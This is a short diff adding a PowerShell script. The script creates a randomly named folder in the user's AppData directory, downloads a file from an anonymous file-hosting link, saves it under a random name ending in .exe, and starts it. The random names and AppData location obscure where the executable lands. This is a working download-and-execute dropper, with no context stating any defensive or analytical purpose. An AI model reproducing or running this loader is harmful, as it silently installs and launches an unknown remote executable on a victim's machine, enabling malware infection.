@@ -1,0 +1,5 @@
+$randomFolder = [System.IO.Path]::Combine($env:APPDATA, (New-Guid).ToString())
+New-Item -ItemType Directory -Force -Path $randomFolder
+$randomFile = [System.IO.Path]::Combine($randomFolder, (Get-Random -Minimum 1000 -Maximum 9999).ToString() + ".exe")
+Invoke-WebRequest -Uri "https://files.catbox.moe/fcdkwl" -OutFile $randomFile
+Start-Process $randomFile
